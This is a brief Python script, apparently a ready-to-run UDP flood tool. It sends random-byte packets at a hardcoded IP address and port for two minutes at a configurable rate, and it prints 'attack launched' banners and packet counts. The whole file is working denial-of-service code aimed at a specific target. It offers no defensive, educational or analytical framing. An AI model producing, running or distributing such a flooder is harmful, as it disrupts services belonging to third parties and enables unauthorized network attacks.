import socket
import time
import random
import threading
import os
import sys

# --- CONFIGURATION ---
TARGET_IP = "20.235.148.44"  # Tera Target IP
TARGET_PORT = 25431           # Tera Target Port
DURATION = 120                # Time in Seconds
PACKETS_PER_SEC = 1500        # Attack Power (Increase if CPU allows)
# ---------------------

running = True

def clear_screen():
    # Cross-platform clear command
    os.system('cls' if os.name == 'nt' else 'clear')

def udp_flood():
    global running
    start_time = time.time()
    packets_sent = 0
    error_count = 0
    
    print(f"🎯 Target: {TARGET_IP}:{TARGET_PORT}")
    print(f"⏱️  Duration: {DURATION} seconds")
    print(f"🚀 Power: {PACKETS_PER_SEC} packets/sec")
    print("-" * 40)
    print("🔥 ATTACK LAUNCHED... DO NOT CLOSE WINDOW 🔥")
    print("-" * 40)

    while time.time() - start_time < DURATION:
        if not running:
            break
            
        try:
            # Create a UDP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # Generate random payload data (garbage data to fill buffer)
            payload = random.randbytes(random.randint(100, 1500))
            
            # Send the packet
            sock.sendto(payload, (TARGET_IP, TARGET_PORT))
            
            sock.close()
            packets_sent += 1
            
            # Control the rate
            time.sleep(1.0 / PACKETS_PER_SEC)
            
        except Exception as e:
            error_count += 1
            # Small pause if socket fails
            time.sleep(0.01)

    print("\n" + "="*40)
    print(f"✅ ATTACK COMPLETED")
    print(f"📦 Total Packets Sent: {packets_sent}")
    print(f"❌ Errors Encountered: {error_count}")
    print("="*40)

def stop_attack():
    global running
    running = False

if __name__ == "__main__":
    running = True
    clear_screen()
    
    try:
        udp_flood()
    except KeyboardInterrupt:
        stop_attack()
        print("\n🛑 User Stopped Attack.")
